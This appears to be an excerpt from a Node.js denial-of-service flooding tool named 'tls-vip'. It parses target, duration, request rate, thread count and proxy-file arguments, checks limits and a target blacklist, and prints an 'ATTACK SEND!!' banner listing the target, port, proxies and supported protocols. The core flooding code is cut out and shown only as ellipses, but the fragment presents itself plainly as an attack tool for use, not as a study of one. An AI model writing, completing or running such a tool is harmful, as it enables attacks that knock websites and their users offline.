...
'*'
 ...
 if (process.argv.length < 7) {
  console.log('node tls-vip target time rate thread proxy'.rainbow);
  process.exit();
}
 const headers = {};
...
if (blackList.includes(args.target)) {
  console.log("This Web is on the Black List.");
  process.exit(1);
}

if (args.time < 0 || args.time > 300) {
  console.log("Time Must Be Between 0 and 300.");
  process.exit(1);
}

if (args.Rate < 0 || args.Rate > 1024) {
  console.log("Rate Must Be Between 0 And 1024.");
  process.exit(1);
}

if (args.threads < 0 || args.threads > 256) {
  console.log("Number of Threads Must Be Between 0 and 256.");
  process.exit(1);
}
...
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
    ...
    console.clear();
console.log(color('red', 'blue')('ATTACK SEND!!'));
console.log(color('red', 'blue')(`Target : ${parsedTarget.host} | Port : ${targetPort}`));
console.log(color('red', 'blue')(`Time : ${args.time.toString()}/300 Second`));
console.log(color('red', 'blue')(`Threads : ${args.threads.toString()}/256`));
console.log(color('red', 'blue')(`Rate : ${args.Rate.toString()}/1024`));
console.log(color('red', 'blue')(`Proxy : ${args.proxyFile} | ${proxies.length}`));
console.log(color('red', 'blue')(`User : admin | Expiry : 99/99/9999`));
console.log(color('red', 'blue')('Support : HTTP1.1/HTTP2/HTTP3/TLSv1.1/TLSv1.2/TLSv1.3'));
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);
